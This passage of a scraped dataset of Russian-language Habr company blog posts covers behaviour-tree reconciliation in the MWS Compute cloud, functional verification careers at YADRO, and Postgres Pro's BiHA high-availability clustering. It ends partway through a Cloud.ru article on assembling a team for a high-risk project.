поведений, гораздо проще создавать, модифицировать и поддерживать в долгосрочной перспективе.По своей сути, дерево поведений — это иерархическая структура, узлы которой могут возвращать только два состояния: успех или отказ. Основные компоненты такой структуры:— Узлы действий: листовые узлы без дочерних элементов, выполняющие конкретные операции. Например, «проверить размер диска» или «установить размер диска». — Selector: узел с дочерними элементами, который последовательно выполняет их, пока один из них не вернёт успех. Если хотя бы один дочерний узел успешен — возвращает успех, иначе — отказ.— Sequence: узел с дочерними элементами, выполняющий их подряд до первого отказа. Успех возвращается, только если все дочерние узлы выполнились успешно.Такая структура достаточна для записи любой логики. Но в чём же её преимущество перед традиционными конечными автоматами или императивным кодом с условными операторами?Дело в том, что применение этого подхода позволяет применять визуальное мышление, в котором человек более силён. Когда алгоритмы показаны в виде деревьев, их гораздо легче понять на интуитивном уровне. Например, мы всегда лучше ориентируемся по карте, чем по текстовым указаниям. Разработчики могут буквально увидеть, как движется логика, что делает поиск багов намного проще.На схеме ниже представлен пример работы логики реконсиляции, построенной по принципу дерева поведений. Это дерево проверяет состояние дисков и сети перед созданием виртуальной машины.Пример работы логики «Деревья поведений». Логика работает сверху-вниз и слева-направо  Рассмотрим пример работы: если диск ещё не создан (сценарий с отказом при проверке Is disk ready?), система автоматически переходит к следующему узлу — Create disk. После успешного создания диска мы переходим на уровень выше в соседний selector, где по аналогичному принципу проверяется готовность сети. Когда оба selector-узла отработали успешно, мы возвращаем статус success на уровень sequence и система может продолжить выполнение следующего этапа создания виртуальной машины.Эта логика действует одновременно на нескольких уровнях. Возьмем, к примеру, процесс подготовки сети — это комплексный процесс с разветвлённой структурой, который охватывает как уровень управления (Control Plane), так и уровень передачи данных (Data Plane). По сути, такая система выполняет работу системного администратора, автоматизируя процессы настройки и поддержки инфраструктуры.Преимущества подхода «Дерево поведений»  Несмотря на то что применение деревьев поведений существенно упрощает и ускоряет разработку, написание логики реконсиляции — один из главных вызовов при создании сервиса Compute. Формат данной статьи не позволит нам нырнуть глубоко в технические аспекты данного вопроса, но мои коллеги обязательно сделают это в следующих материалах.  Так что же находится в сердце MWS?  Compute — один из фундаментальных сервисов в облачной инфраструктуре MWS, который предоставляет пользователям возможность запуска и управления вычислительными ресурсами. Мы построили его архитектуру на принципах декларативности. Такой подход позволяет клиентам просто описывать желаемое состояние системы, не погружаясь в технические детали реализации.Особое внимание мы уделили реконсиляции — сложному процессу согласования желаемого и текущего состояния системы. Наше решение, основанное на дереве поведений, успешно применяется не только в облачных технологиях, но и в робототехнике и геймдеве.Compute — это основа любого облачного сервиса, без которого сложно представить работу других сервисов облачной платформы, поэтому мы подошли к его разработке тщательно, предусмотрев масштабирование и гибкость системы.Подписывайтесь на хаб, наша команда продолжит рассказывать, как устроены компоненты Compute на более низком уровне. Будет интересно.Читайте и смотрите другие материалы про строительство нового облака MWSЗачем мы строим собственное публичное облако? Рассказывает CTO MWS Данила ДюгуровРеалити-проект для разработчиков Building the Cloud. Показываем и рассказываем про архитектуру сервисов платформы ещё до запускаПодкаст «Расскажите про MWS». О людях и технологиях нового облака MWSКарьера в MWS. Стань частью одной из сильнейших инфраструктурных команд на рынке"
30,Путь в микроэлектронику через верификацию: руководство для начинающих,YADRO,Тут про железо и инженерную культуру,0,"Программное обеспечение, Аппаратное обеспечение, Связь и телекоммуникации",2025-04-10,"Привет, Хабр! Меня зовут Дмитрий Кишко, я руководитель группы функциональной верификации в YADRO. Представьте, что вы строите космический корабль. Он еще не взлетел, но любая ошибка в конструкции уже может стоить миллионы или даже сорвать всю миссию. В мире микроэлектроники ситуация похожа: перед тем как чип попадет на производство, его работу проверяют сотни раз, но не физически, а в симуляторах. Этот этап называется функциональной верификацией, и без него современная электроника просто «не взлетит».В статье расскажу, как работает команда функциональной верификации, с какими задачами сталкиваются инженеры и почему эта область так важна.Дисклеймер: материал рассчитан на тех, кто только начинает знакомство с миром микроэлектроники и функциональной верификации. Если вы студент технического вуза, джун или просто интересуетесь, как попасть в эту сферу, — здесь вы найдете базовое понимание процессов, задач и навыков, необходимых для старта. А если вы опытный верификатор, ждем ваших дополнений в комментариях! Что такое функциональная верификация и чем она отличается от тестированияЧасто функциональную верификацию путают с тестированием, но между ними есть разница.Формально верификация — это процесс проверки, соответствует ли система заданным требованиям. Тестирование в этом контексте — всего лишь один из инструментов, который помогает провести такую проверку. Мы разрабатываем тесты, запускаем их, анализируем результаты — все это, безусловно, часть верификации, но далеко не вся ее суть.На практике верификация охватывает куда больше: разработку стратегии, планирование, выбор методов и подходов, определение уровней и этапов тестирования, построение так называемой пирамиды тестирования и многое другое. Это комплексная, системная работа, направленная на то, чтобы обеспечить качество продукта на всех этапах его создания.Разница между тестированием и верификацией особенно заметна в области аппаратной разработки, например при проектировании микросхем. Здесь верификация — это уже полноценная инженерная дисциплина со своими методологиями, инструментами и практиками. Она охватывает весь цикл проверки корректности проекта и выходит далеко за рамки простого написания и запуска тестов.Продукты YADRO — серверы и системы хранения данных, сетевое и телеком-оборудование, клиентские устройства — проходят весь цикл создания — от идеи до воплощения и выхода на рынок. И некоторые системы не только тестируются, но и верифицируются. Важную роль здесь играет команда функциональных верификаторов, которая разрабатывает решения для внутренних проектов компании, поддерживая технологическое развитие.Студент анализирует результаты симуляции цифровой схемы — проверяет корректность работы проектируемого модуляЕсли тестировщик обычно проверяет уже существующий продукт, то верификатор подключается к проекту еще на стадии его создания. Чтобы предсказать и предотвратить возможные ошибки еще до того, как продукт попадет в производство.Функциональная верификация — это лишь один из видов верификации. На практике ее обычно дополняют модульной и системной верификацией. Такое разделение помогает выстраивать более понятную и логичную структуру проверки.Функциональная верификация фокусируется на проверке соответствия функциональным требованиям, которые описывают, что должно делать устройство или система. В рамках модульной верификации мы, как правило, проверяем отдельные блоки (или модули) на соответствие базовым требованиям, описанным в спецификации.А на уровне системной верификации мы уже переходим к более сложным сценариям: проверяем, как вся система работает целиком, как взаимодействуют между собой модули, реализуются ли полнофункциональные системные сценарии.Такой подход — с четкой декомпозицией уровней верификации — критически важен. Проверка только на одном уровне не дает гарантии, что система в целом будет работать корректно. Только пройдя каждый из этапов, можно уверенно говорить о ее надежности и соответствии требованиям.Как работает команда функциональной верификацииПроектирование систем на кристалле (СнК) — это сложный процесс, включающий в себя работу множества команд. В YADRO этим занимается порядка 20–30 коллективов, каждый из которых отвечает за отдельные аспекты: от физического дизайна до логики работы компонентов. Кто участвует в разработке СнК, мы уже писали ранее. Мы создаем различные тестовые сценарии на ранних этапах разработки, чтобы убедиться, что все требования к системе строго соблюдены. Это критически важно, так как гарантирует, что после производства все будет работать без сбоев. Допустим, мы запускаем проверку вычислительного кластера. В его основе — процессор, спроектированный на архитектуре RISC-V. После того как кристалл собран из множества отдельных компонентов, необходимо протестировать его работу в реальных сценариях.Один из таких тестов — проверка производительности. Мы запускаем вычислительные задачи и анализируем:Какую производительность удается достичь непосредственно в чипе?Сколько энергии потребляет система при таких нагрузках?Такие тесты позволяют оценить эффективность работы вычислительного кластера и выявить возможные узкие места. Например, низкую пропускную способность между вычислительным ядром, интерконнектом и подсистемой памяти.Без верификации вероятность ошибок очень высока, и это может привести к некорректной работе оборудования. Поэтому задача инженеров-верификаторов — тщательно изучать документацию, разрабатывать тестовые сценарии и подтверждать, что аппаратура соответствует заявленным характеристикам и функционирует так, как задумано.Время, необходимое для прохождения жизненного цикла СнК, зависит от команды и применяемых технологий. В индустрии считается, что эффективная работа означает выпуск нового тейп-аута (tape-out) раз в полгода. Это говорит о том, что процессы налажены и команда работает с высокой скоростью.Однако сроки могут значительно варьироваться. Если проект строится на полностью собственных разработках без использования сторонних решений, цикл разработки может растягиваться до трех лет. Все определяется стратегией компании: в одних случаях обновления происходят каждые шесть месяцев, в других — раз в несколько лет.Жизненный цикл верификации в СнКРабота специалистов по верификации требует не только глубоких знаний в области программирования, но и понимания принципов работы аппаратного обеспечения. Инженеры-верификаторы разрабатывают автоматизированные тесты, которые проверяют корректность работы различных компонентов — например, контроллеров памяти или модулей обработки сигналов.Ошибки на этапе проектирования могут стоить компании миллионов долларов, поэтому инженеры по верификации активно работают с архитектурой разрабатываемых решений, проверяя их на соответствие техническому заданию.В основном мы пишем тесты на языке C, но иногда прибегаем к C++ — для специализированных тестов, программ по производительности и других задач.До этапа изготовления микросхемы можно вносить любые изменения, главное — укладываться в подчас жесткие сроки. Дата отправки на фабрику фиксирована, и сдвигать ее нельзя. Поэтому важно четко понимать, что именно мы делаем, как это реализуем и какие задачи имеют наивысший приоритет.Как строится работа внутри командыФункциональная верификация как часть разработки СнК — это командная работа. В процессе проектирования микроэлектроники задействованы различные специалисты: системные программисты, разработчики, инженеры по верификации, инженеры-топологи, RTL-дизайнеры. Все они должны работать синхронно, чтобы обеспечить качество конечного продукта.Без синергии между командами невозможно создать хороший продукт. Мы должны понимать логику коллег, а они — наши требования. В этом смысле наша общая работа похожа на оркестр, где каждый играет свою партию, но вместе создается гармоничное звучание.Процесс верификации чипов в крупных компаниях — это сложная координация работы примерно 30 команд. У каждого инженера есть связи с несколькими командами, и его работа во многом определяется тем, выполнили ли коллеги свою часть работы. Инженеру-верификатору важно наладить эффективное взаимодействие со смежными командами, чтобы процесс не замедлялся и верификация не становилась «бутылочным горлышком».Инженеры из отдела функциональной верификации отвечают за моделирование работы системы и анализ результатов. Использование инструментов и методов автоматизированного тестирования позволяет значительно сократить время на выявление возможных проблем. Мы используем автоматизированную генерацию тестов для адресного пространства и вычислительного кластера, в том числе на основе конфигурационных файлов формата SystemRDL. В документации заранее определены адресное пространство и регистры. Мы автоматически считываем эти данные, формируем тесты и используем их для проверки. Такой метод позволяет избежать ручного написания тестов: однажды созданная автоматизация регулярно запускает проверки при каждом новом обновлении системы.Прежде чем чип отправится в производство, инженеры-верификаторы должны убедиться, что он работает без ошибок. Для этого тестируются как аппаратные, так и программные компоненты на разных уровнях.Верификация — это проверка аппаратуры, чипов, кристаллов. Без понимания того, как они работают, двигаться дальше невозможно. Можно написать программу, но, если не осознавать, что именно она делает, как она взаимодействует с железом и как определить, корректно ли она функционирует, работа теряет смысл.Уровни, на которых может работать инженер по верификации СнК:Юнит-верификация — тестирование аппаратуры с использованием языков описания цифровой аппаратуры, например SystemVerilog.Функциональная верификация — проверка системы с использованием программ, написанных на низкоуровневых языках программирования, например С, aas.Системная верификация — проверка работы СнК на уровне целевой ОС.Вся эта работа проводится до выпуска чипа. На каждом этапе используются разные инструменты, но цель одна — убедиться, что все функционирует как надо. В конечном счете, задача верификаторов — проверить работоспособность системы во всех сценариях.Как попасть в команду верификацииВ области функциональной верификации дефицит квалифицированных кадров. Поэтому компания YADRO активно развивает образовательные инициативы: создает курсы и предлагает стажировки для студентов технических вузов.Я окончил Московский авиационный институт, факультет радиоэлектроники летательных аппаратов. По специальности я инженер, занимающийся проектированием радиосистем, и долгое время работал в этой области — программировал и разрабатывал радиосистемы.Последние пять лет я перешел в сферу управления командами, став тимлидом. Понял, что мне это интересно, прошел собеседование и присоединился к команде. Сейчас занимаюсь микроэлектроникой — сложной, но невероятно увлекательной сферой, которая меня действительно вдохновляет.Если вы студент и хотите развиваться в микроэлектронике, лучший способ — присоединиться к образовательным программам. Каждый год YADRO организовывает или поддерживает инициативы, где можно получить знания и познакомиться с экспертами, задать им вопросы и, возможно, найти свою первую работу.Члены жюри и участники инженерного хакатона SoC Design ChallengeВот несколько вариантов, где можно погрузиться в верификацию систем на кристалле (СнК):Практические курсы YADRO — проходят раз в год, один из них посвящен верификации СнК, подробнее здесь.Образовательные программы в вузах — например, совместная магистратура по микроэлектронике от YADRO МИЭТ. Мы уже писали о том, как за два года ребята проходят полноценный маршрут проектирования системы на кристалле — от спецификации до топологии.Стажировка «Импульс» — еще один путь для студентов и молодых специалистов войти в сферу. В 2024 году студенты могли выбрать стажировку по более чем 60 направлениям: от разработки микропроцессоров до бухгалтерии. Участники не только решали реальные задачи, но и знакомились с инженерной культурой компании, а полученным опытом уже делились здесь. Сейчас открыт набор на летнюю стажировку «Импульс» от YADRO, в том числе по направлению системной верификации. Это отличная возможность для студентов и молодых специалистов попробовать себя в реальных инженерных задачах и получить опыт работы с современными технологиями. Подробности о стажировке и форма для подачи заявки — на официальной странице программы. Инженерный хакатон по разработке микропроцессоров — SoC Design Challenge. Один из его треков посвящен системной верификации. Как проходит хакатон — узнаете из статьи от студентов (ныне — сотрудников YADRO), победивших в хакатоне 2024 года. Школа синтеза цифровых схем — это образовательная программа, где студенты осваивают основы разработки цифровых микросхем и изучают перспективные направления в индустрии цифрового дизайна. Учебная программа, основанная на курсе Массачусетского технологического института (MIT), включает изучение компьютерной архитектуры, микроархитектуры процессорных ядер и освоение профессиональных средств проектирования серийных микросхем ASIC.Какие хард-скилы важныФункциональная верификация может быть интересна тем, кто увлекается архитектурой современных компьютеров, микроэлектроникой и хочет глубже разобраться в том, как устроены процессоры и системы на кристалле (СнК). Особенно хорошо в эту сферу вписываются специалисты с образованием в области микроэлектроники, электроники или радиотехники.Первый день инженерного хакатона SoC Design ChallengeСтуденты, заинтересованные в этом направлении, обычно начинают с изучения базовых курсов, читают специализированные материалы, слушают подкасты и знакомятся с архитектурами процессоров. Затем приходят на стажировки, где узнают больше о реальных задачах функциональной верификации и ее роли в разработке микроэлектронных систем. Ниже — несколько навыков, которые важны для этой профессии: Языки программирования — владение хотя бы одним языком, используемым в сфере (например SystemVerilog, C, Python).Понимание микроэлектроники и процессорной техники — знание архитектур процессоров, принципов их работы.Цифровой дизайн — основы проектирования цифровых схем: триггеры, регистры, шины данных.Знание процессов производства микросхем — понимание их типов и методов изготовления.Системы контроля версий и CI/CD — базовые навыки работы с Git и автоматизированными инструментами тестирования.Дополнительным плюсом будет опыт программирования микроконтроллеров и взаимодействия с «железом». Например, программисты, которые занимаются встраиваемыми системами (embedded systems), часто переходят в функциональную верификацию СнК, поскольку задачи в этих областях схожи. Разница лишь в том, что здесь код создается не для конечного продукта, а для обеспечения качества внутренних разработок.Функциональная верификация — это не только программирование, но и работа с аппаратными компонентами, что делает ее особенно привлекательной для тех, кто любит сочетание софта и железа.Для меня самая большая мотивация — видеть, как наши усилия превращаются в реальные, работающие устройства. Мы решаем сложные задачи, и это вдохновляет.А если вы уже работаете верификатором, расскажите в комментариях, как вы пришли в эту профессию."
31,High Availability в Postgres Pro без головной боли,Postgres Professional,Разработчик СУБД Postgres Pro,0,"Программное обеспечение, Консалтинг и поддержка, Информационная безопасность",2025-04-10,"BiHA (Built-in High Availability) — это расширение ПО СУБД Postgres Pro Enterprise, которое управляется утилитой bihactl и SQL-функциями. BiHA, вместе с улучшениями в ядре и управляющим процессом biha-worker, позволяет объединить несколько серверов в отказоустойчивый кластер. В этом High Availability кластере данные автоматически копируются между серверами с помощью физической репликации, и обеспечивается автоматическое переключение на резервный сервер в случае сбоя основного.Что делает BiHA?BiHA объединяет несколько серверов в HA кластер, автоматически настраивая репликацию между ними. Для этого используются специальная утилита bihactl, которую мы разработали для упрощения процесса конфигурирования HA кластера. Вам достаточно указать параметры узлов (например, их расположение и роли), и HA кластер будет собран автоматически.Основное преимущество BiHA — возможность автоматического переключения роли мастера (лидера) на другой узел в случае сбоя. BiHA берёт на себя управление переключением, что значительно упрощает эксплуатацию.Особенности BiHABiHA является частью ПО СУБД Postgres Pro Enterprise, что отличает её от сторонних решений. Это позволяет минимизировать сложности интеграции и повысить надёжность.Простота установки и управления: BiHA значительно упрощает настройку и управление отказоустойчивого кластера, что делает её удобной для администраторов баз данных.Параметр nquorum определяет минимальное количество узлов, необходимых для проведения выборов нового лидера. Если сеть разделяется, и лидер оказывается в изоляции, он автоматически переходит в режим Read-Only, запрещая любые изменения данных. Это гарантирует, что в другой части сети, где кворум соблюдается, будет выбран новый лидер, а данные на старом лидере останутся согласованными.BiHA использует алгоритм RAFT для однозначного определения нового лидера. Этот алгоритм гарантирует, что в HA кластере всегда будет выбран только один лидер, что предотвращает разделение данных (Split-Brain). Что же такое Raft?Raft — это алгоритм распределённого консенсуса, предназначенный для упрощения и повышения надёжности управления распределёнными системами в сетях с ненадёжными узлами, где возможны сбои и асинхронная передача сообщений. Принцип Raft заключается в том, чтобы реплицировать лог транзакций на всех узлах через выбранного лидера, что обеспечивает согласованное состояние системы даже при отказах отдельных компонентов. Алгоритм разбит на понятные модули, такие как выбор лидера, репликация логов и обработка различных сбоев, что делает его более интуитивным для реализации и отладки по сравнению с более сложными алгоритмами консенсуса, например, Paxos. Такой подход позволяет системам работать корректно и сохранять целостность данных в условиях ненадёжных вычислений, что имеет решающее значение для современных распределённых IT-сред.Узел рефериДля принятия решений о выборе лидера всегда требуется минимум три участника. Если всего два узла в отказоустойчивом кластере, то разрыв сети между ними приведёт к ситуации, когда кворум не соблюдается, и оба узла не будут обслуживать запросы пользователей. Когда же базы данных очень большие, то иметь лишнюю копию БД на третьем узле слишком дорого, поэтому для обеспечения надёжности в кластере BiHA может использоваться узел рефери. Это ещё один участник отказоустойчивого кластера, который располагается на отдельном сервере, с установленным ПО СУБД Postgres Pro Enterprise, работает экземпляр и управляющий процесс biha-worker, но на этом узле в БД нет пользовательских данных, поэтому нет таких же требований к дисковой подсистеме, что на других узлах. Этот узел выполняет важную роль в процессе голосования. Обратите внимание: рефери не следует размещать на том же сервере или гипервизоре, что и мастер или реплика. Это исключает влияние на работу рефери тех же самых сбоев, что и на мастере.Рефери используется в следующих случаях:Для обеспечения кворума: в отказоустойчивых кластерах с небольшим количеством узлов (например, два узла) рефери помогает избежать ситуации, когда невозможно выбрать нового лидера из-за недостатка голосов для кворума.Для накопления WAL: рефери может получать и накапливать журнал транзакций (WAL) с лидера. В случае сбоя, рефери может передать накопленные валы новому лидеру, что особенно полезно, если реплика не успевает получить или применить валы. Узел рефери может быть синхронным или асинхронным, в зависимости от конфигурации отказоустойчивого кластера.Приоритеты узловСовсем недавно в BiHA появилась поддержка приоритетов узлов. Это решение было разработано в ответ на запросы заказчиков, которым нужно было контролировать, какой именно узел станет лидером в случае сбоя основного сервера.Приоритеты работают только в синхронном HA кластере по очень простой причине: в асинхронном режиме мы не можем гарантировать, что какая-то конкретная из реплик имеет наиболее актуальные данные (WAL) на момент сбоя. Если бы выбор лидера происходил, когда все реплики в асинхронном режиме, то, несмотря на приоритеты, была бы выбрана именно реплика, которая содержит максимум данных, то есть, наименее остальных отстаёт от Лидера. В синхронном же режиме BiHA выбирает реплику в соответствии с указанными приоритетами, конечно же, при наличии актуального WAL.Приоритеты позволяют задать задержку (в секундах), в течение которой реплика не будет выдвигать себя кандидатом на роль лидера. Например:если у одного узла приоритет 10, а у другого 0 (самый высокий приоритет), то реплика с приоритетом 10 будет ждать 10 секунд, прежде чем выдвинуть себя кандидатом;реплика с приоритетом 0 (высший приоритет) сразу выдвинет себя кандидатом и, скорее всего, станет новым лидером;если реплика с высоким приоритетом по какой-то причине не сможет стать лидером, то через 10 секунд реплика с приоритетом 10 выдвинет себя кандидатом.Такая система приоритетов обеспечивает мягкую балансировку и исключает полный отказ HA кластера, даже если некоторые узлы временно недоступны.Реплики, которые никогда не станут лидерамиНекоторые заказчики сталкиваются с ситуацией, когда определённая реплика вообще не должна становиться лидером. Например:Серверы с ограниченными ресурсами: это могут быть серверы, которые используются исключительно для сохранности данных, но не подходят для выполнения роли лидера из-за недостаточной производительности.Реплики для чтения: на такие реплики может быть направлена нагрузка для выполнения запросов на чтение. Однако, если на такой реплике выполняется долгий запрос, она может отставать в применении WAL, и её выбор в качестве лидера приведёт к потере данных.Для таких случаев в BiHA добавлен параметр can_be_leader=false (не может быть лидером). Если этот параметр включён, реплика никогда не станет лидером.Параметр can_be_leader также помогает в создании геораспределённых HA кластеров, что особенно актуально для заказчиков, использующих несколько дата-центров (ЦОДов). Узел HA кластера с параметром can_be_leader=false можно разместить в резервном ЦОДе, создав таким образом реплику, которая не станет автоматически лидером в другом ЦОД, и администратору не придётся из-за этого переносить все сервера приложений в другой ЦОД. Это решает также одну из ключевых проблем при работе с несколькими ЦОДами: заказчики часто хотят, чтобы переключение между ЦОДами происходило только вручную, не все хотят доверять автоматике, особенно в случаях, когда переключение на резервный ЦОД требует не только смены лидера в базе данных, но и переноса других приложений. Ручное переключение позволяет администратору активировать резервный ЦОД, убедившись, что все приложения и системы готовы к переходу. В случае выхода из строя всего основного дата-центра в резервном ЦОДе будет реплика с полной копией базы данных, которая постоянно получала изменения с основного ЦОДа, и поэтому содержит все данные. Чтобы перевести её в рабочий режим, достаточно лишь включить параметры can_be_leader=true и настроить параметр biha.minnodes=1, которые позволяют этому узлу после применения параметров временно работать без других узлов. Если же требуется при сбое всего основного ЦОДа развернуть целиком HA кластер BiHA в резервном ЦОД автоматизировано, то можно это сделать буквально одной командой.Обработчики событий (Callbacks)В BiHA была добавлена возможность создания пользовательской SQL-функции обработчиков событий BiHA. Эта функция позволяет выполнять пользовательский SQL-код при изменении состояния отказоустойчивого кластера, например, при выборе нового лидера или выходе узла из строя.Обработчики могут быть использованы для:оповещения администраторов — например, создания алертов в системах мониторинга;интеграции с другими приложениями — например, уведомления прокси, балансировщиков, или даже серверов приложений о смене лидера, чтобы они могли перестроить свои пулы соединений;изоляции старого лидера — в некоторых случаях требуется полная изоляция старого лидера буквально на физическом уровне (например, перезагрузка или отключение сети или электричества у сервера).Обработчики могут выполнять разные задачи, но важно избегать ситуации, когда обработчик изменяет состояние кластера BiHA, иначе это вызовет бесконечный цикл изменений и, соответственно, бесконечный вызов функций обработчика.В каких случаях пригодится BiHA  BiHA уже активно используется многими клиентами начиная с версии ПО СУБД Postgres Pro Enterprise 16. Наши пользователи отмечают, что эта технология обеспечивает надёжность и удобство в эксплуатации.Мы рекомендуем использовать BiHA, если у вас появилась задача построения отказоустойчивых кластеров ПО СУБД Postgres Pro Enterprise. Новые функции, такие как узел рефери, приоритеты, параметр can_be_leader, поддержка геораспределённых HA кластеров и обработчики событий, делают её идеальным решением для обеспечения высокой доступности данных.Подробнее о настройке и возможностях BiHA можно узнать в документации ПО СУБД Postgres Pro Enterprise (https://postgrespro.ru/docs/enterprise/17/biha-solution)."
32,11 друзей менеджера: как собрать и не растерять команду для высокорискового проекта,Cloud.ru,Провайдер облачных сервисов и AI-технологий,0,"Программное обеспечение, Веб-сервисы, Информационная безопасность",2025-04-10,"Уверен, каждый из вас смотрел фильмы про ограбления, аферы или шпионские истории. В этих фильмах герои — сплоченная самоорганизованная команда, каждый член которой — уникальный спец, сильный в чем-то своем. Мой опыт показывает, что здорово, когда команда для высокорискового проекта такая же, как для авантюр из этих фильмов.Я Александр Юдин, занимаюсь развитием и эксплуатацией IТ-инфраструктур и информационных систем более 20 лет. А сейчас руковожу проектами по развитию и эксплуатации платформы Cloud.ru Evolution. В статье поделюсь своим подходом к  формированию команд для высокорисковых проектов, неудача в которых может негативно повлиять на карьеру.С чего все началось, или как я понял, что будущий проект — та еще авантюраВ январе-феврале 2022 года позвонил хороший знакомый и предложил мне курировать один проект. Нам предстояло построить новую облачную платформу на базе собственных разработок. Конкурентами были VMware, Amazon Web Services и Microsoft Azure. MVP продукта мы должны были представить в декабре того же года, а уже в 2023 — начать разворачивать продакшн в трех дата-центрах!Проект заинтересовал меня — он обещал быть амбициозным и в чем-то даже уникальным. Уже на старте на базе моего опыта у меня появилось несколько идей, как его можно реализовать.Когда устроился в компанию, я начал погружаться в детали. Эта предпроектная работа заняла у меня около двух месяцев — с учетом того, что я занимался ей один. При этом для исследования перед проектом нередко собирают целую команду, специалисты из которой выясняют, кого и для каких задач надо искать.За это время я осознал: мои идеи не сработают. Опыт не особо релевантен, а направлений работы куда больше, чем я мог представить... Построить систему, которую кто-то уже написал, выпустил мануалы и спеки было бы намного проще. Тут же предстояло создавать проект с нуля.Что было на старте: цель — есть, команды — нет. Путь не определен, код не дописан, ресурсы не подвезли, дедлайн по запуску MVP — меньше чем через год. Проект намечался высокорискованным, где каждый шаг превращается в research — поиск нужного и изучение неизвестного.По классификации Кеневина, есть проекты простые, сложные, комплексные и хаотические. В нашем случае (почти) господствовал хаос. Источник: vige.seЧтобы понять, что делать, спрогнозировать риски и определиться с фронтом работ, я знакомился и консультировался с множеством коллег. Так я искал людей, навыки которых окажутся полезны в работе. Благодаря такому общению я занырнул в каждое направление — и только тогда начал примерно понимать, как добраться до вожделенного сейфа с кушем, в моем случае — до цели проекта.Проект высокорисковый, данных почти нет. Что делать?Перед началом запуска проекта я был один. У меня не было того, кто, к примеру, мог бы продумать архитектуру, сети, развернуть софт. Мне предстояло набрать в команду нужных людей, объяснить, зачем им все это надо, да еще и так, чтобы эта команда подготовила MVP в довольно сжатые сроки — до конца года.На основе минимальных данных о проекте, которые я собрал сам и через беседы с коллегами, мне удалось сформировать портрет и состав потенциальных членов команды. Нужных специалистов в начале 2022 года по понятным причинам было найти непросто, поэтому оставался один вариант — хантить кадры внутри компании.Шаг 1. Определиться с кругом потенциальных членов «банды»Первый шаг — найти в компании тех, кто мог бы ввязаться в эту авантюру.  Но как вообще понять, захочет ли специалист пойти в проект? На что делать ставку, чтобы он захотел присоединиться?Я действовал из следующего соображения: всегда найдутся те, кого не устраивает положение дел в текущей команде. Это можно косвенно понять из разговоров, а еще по настроению внутри компании. Только я был аккуратным и действовал мягко, чтобы не нажить врагов внутри компании. Все-таки мне тут еще работать 🤭.Коллеги, которые хотели бы что-то изменить в своей работе, мне и были интересны — вербую! Был у меня забавный случай, когда искал в команду ГИПа. В смежной команде был ГИП, с которым я неплохо общался. Однажды я предложил ему перейти ко мне. Об этом прознал лид смежной команды и сотрудника мне не отдал. Тот в итоге отказался со словами: «Нет, со мной поговорили, сказали, что есть другие важные задачи».Потом каждый раз в течение полугода, когда я просто заходил поприветствовать коллег, лид, завидев меня через пол опенспейса, кричал, чтобы никто из команды не поддавался моему влиянию. «Так, парни, его не слушать, игнорируйте его, пожалуйста!».Шаг 2. Понять желания каждого «завербованного» и склад его ума Далее — самое интересное: заинтересовать нужных людей и привлечь их в команду. Я запланировал набрать для проекта не более десяти человек, чтобы эффективно руководить ими без посредников. Если бы людей оказалось больше, в команде могло бы нарушится единство, а я был бы не в состоянии контролировать всех, уделять время каждому.Есть исследования, которые подтверждают, что примерно до десяти человек — оптимальный размер команды. Например, Джефф Сазерленд, один из авторов Scrum и Agile, утверждает, что лучшие результаты дают команды до 7 человек.Итак, на первом шаге я определился с тем, кого хочу себе в команду. Следующий этап — поговорить с каждым по отдельности и заинтересовать проектом. Как я проводил первый разговор:Общался тет-а-тет в неформальной обстановке. Как пример — предлагал ему или ей сходить в ближайший кафетерий, пообедать вместе.Рассказывал о проекте.Внимательно слушал. Обращал внимание на детали — в них то и крылось то, что человеку действительно важно. На этом я делал акценты в дальнейшем, когда надо было стыковать цели человека и проекта.Писал для себя саммари после встречи. Я фиксировал основные моменты, чтобы не упустить ничего важного.Для меня смысл первой встречи — понять, насколько специалист впишется в команду. Тут речь не столько про компетенции, а про mindset (склад ума). Поясню, что я имею в виду.В высокорисковом проекте часто надо мыслить нестандартно, отходить от намеченного плана или действовать вовсе без него. А может оказаться, что человек привык идти по проторенной дорожке и не готов работать в условиях неопределенности. Тогда мы, к сожалению, не сработаемся — этот конфликт будет всплывать на протяжение всего проекта, что может застопорить разработку и демотивировать всех участников.Шаг 3. Найти, в каких точках соприкасаются желания специалиста и цели проекта Я использовал такой ход — состыковывал цели коллеги со своими. Идеально, когда специалист сам заинтересован в реализации проекта, когда это нужно не только компании для получения прибыли, но и самому человеку. Именно для этого на первой встрече я выписывал детали, которые упоминал коллега, — их я учитывал в дальнейшем предложении. После того, как я беседовал с человеком, я давал ему неделю-две на обдумывание. А после — назначал новую встречу, где мы более подробно проговаривали детали. На эту встречу я шел с пониманием масштабов проекта, амбиций человека, которому я предлагаю со мной работать, и выгод, которые была возможность достать: материальное вознаграждение, рекомендацию перед тимлидом, масштабность и уникальность будущей работы.Так вот — я затронул мотивацию, стыковку целей проекта и сотрудника. Как это сделать? Что говорить, чтобы человек захотел прийти в команду? Начну с того, что всех сотрудников я условно делю на «материальщиков» и «идейных», но оговорюсь — в разговоре с любым из них стоит коснуться и денег, и самореализации. «Материальщиков» больше интересуют деньги и все, что с ними связано: карьера, премии, бонусы. Я позаботился о бенефитах для них заранее: переговорил с линейными руководителями и обсудил возможность индексации, премии и так далее. «Идейным» важнее самореализация и чувство принадлежности к чему-то большему. С ними может быть немного сложнее, потому что есть шанс ошибиться в предположениях о том, в каком направлении человек хочет расти.Тем не менее, как с «материальщиками», так и с «идейными» отлично работает простой прием: показать человеку, насколько он и его труд важны для команды.Был коллега, которого я хотел схантить к себе в команду. Из первого разговора с ним я знал, что финансовый вопрос у него закрыт, деньги его не сильно волновали. Ему была важна самореализация, ощущение причастности к чему-то большому — и в разговоре с ним я показал, какой по амбициям и масштабу проект он может создать. — Представь, что мы вместе с тобой строим IaaS-платформу, выпускаем ее в продакшн, приходят довольные клиенты. Эта платформа стала для компании ключевой. Ты идешь в центре оживленного мегаполиса, и вот видишь на башне Москвы-сити билборд «Cloud.ru Evolution» — это платформа, которую ты сделал! Звучит круто, правда?Шаг 4. Поддерживать мотивацию каждого члена командыИтак, «банда» в сборе. Признаюсь, на старте мне удалось собрать не всех, кто был нужен. Пришлось идти на компромиссы: отсылать кого-то из своей команды в смежную, чтобы «выведать» информацию по нужной теме, много искать в интернете, брать консультации коллег — с условием, что никого у них не буду хантить. Что-то даже пришлось делать самому, например: рисовать фасады стоек, считать количество коммутаторов, портовую емкость, определять кабели подключения.Несмотря на это, на первых порах мы были полны драйва и энергии. Сносили все препятствия, даже их не замечая. Но со временем мотивация команды потихоньку стала слабеть. Что в таком случае делать?Пожалуй, важно отслеживать моменты, когда команда или отдельные ее члены теряют энтузиазм, чтобы вовремя взять ситуацию в свои руки, вдохновить людей, проявить участие, посодействовать в решении каких-то личных проблем.О 